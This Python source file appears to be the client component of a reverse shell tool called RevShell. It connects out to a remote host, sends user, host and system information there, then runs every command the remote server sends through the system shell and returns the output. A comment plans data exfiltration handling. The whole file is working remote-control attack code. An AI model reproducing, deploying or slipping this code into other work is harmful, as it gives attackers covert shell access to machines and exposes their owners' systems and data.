# TODO: create handling for data exfiltration
import getpass

from .nodeutils import (
    os,
    shutil,
    Path,
    subprocess,
    struct,
    sys,
    socket,
    StreamSocket,
    utils
)


class Client(StreamSocket):
    """TCP socket client class for the command shell"""
    # TODO: add handling for custom shell executables
    def __init__(
        self,
        rhost: str,
        port: int,
        opsys: str,
        verbose: bool,
        debug: bool,
        shell: str = None
    ):
        shell_path, name = self.get_exec(opsys, shell)
        if verbose:
            utils.status(f"shell => {name}")
        super().__init__(rhost, port, shell_path, debug)
        self.Verbose = verbose

    def execute(self, command: str) -> tuple:
        """Execute the command using system shell subprocess,
        returns the a list of stdin, stdout, and stderr."""
        family = self.check_special(command)

        if family is not None:
            if family == "clear":
                #return [command.encode(), utils.Ansi.clear(), b""]
                return utils.Ansi.clear(), b""

            if family == "cd":
                exists, path = self._change_dir(command)
                if exists:
                    return path.encode(), b""
                else:
                    return b"", f"Cannot resolve path {path}".encode()

            if family == "ls":
                if utils.OPSYS != "nt":
                    command = f"{command} -A --color"
            # TODO: fix issue with grep throwing false-positives
            elif family == "grep":
                #if utils.OPSYS != "nt":
                #command = f"{command} -i --color"
                pass

        return self._run_cmd(command, self.Shell)

    def connect(self) -> None:
        """Initiate connection to remote server shell"""
        # TODO: configure timeouts and blocking, then test
        sock = socket.socket()
        #sock.settimeout(60)

        try:
            sock.connect((self.Address, self.Port))
        except socket.timeout:
            utils.throw(f"Connection with {self.Address}, timed out.")
        except:
            utils.throw(f"Could not establish connection with {self.Address}")

        try:
            # receive <== connection established message
            establish_msg = self.recv_msg(sock)
            utils.status(establish_msg)

            self.LastWD = str(Path.home())
            os.chdir(str(Path.home()))
            hostinfo, sysinfo = self.get_sysinfo()

            # send ==> current user/host information
            self.send_msg(sock, hostinfo)

            # send ==> system information
            self.send_msg(sock, sysinfo)

            while True:
                # receive <== command to execute
                command = self.recv_msg(sock)
                family = self.check_special(command)

                if family == "exit":
                    if self.Verbose:
                        utils.stdin_status("exit")
                        utils.status("Exiting RevShell.")
                    break

                cmd_out = self.execute(command)
                stdout = cmd_out[0]
                stderr = cmd_out[1]

                if stderr == b"":
                    output = stdout
                    level = "output"
                else:
                    output = stderr
                    level = "error"

                if self.Debug:
                    # TODO: fix and test debug options
                    utils.status(output.decode(), level, command)
                elif self.Verbose:
                    utils.stdin_status(command, level)

                # send ==> command output
                if output == stdout:
                    self.send_output(sock, output.decode(), "output")
                else:
                    self.send_output(sock, output.decode(), "error")
        except Exception as exc:
            self.except_handler(exc)
        finally:
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            finally:
                sock.close()
